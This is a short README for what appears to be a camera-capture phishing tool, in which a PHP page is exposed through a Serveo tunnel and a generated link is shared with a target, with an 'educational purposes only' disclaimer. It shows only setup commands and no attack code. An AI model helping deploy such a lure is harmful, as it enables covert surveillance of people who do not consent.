# Camera Tracker

Requirements : Python3 and open ssh

This is a PHP-based camera tracker that can be hosted locally using Serveo. To use it, follow these steps:

1. Clone the repository:

   $ git clone https://github.com/Blankred0/Camera-tracker

   $ cd Camera-tracker

3. Run the tracker:

   $ python3 bot.py

   $ serveo

   (For a subdomain of your choice you need to run ssh-keygen)

5. Copy the generated link and share it with the intended user. To prevent the website from sleeping in the next 5 minutes, run the following command in a separate window:

   $ python3 sleep.py

   Paste the previously copied link. Your site will remain active as long as your computer is running.

Disclaimer: This code is provided for educational purposes only. I am not responsible for any actions taken using this code.
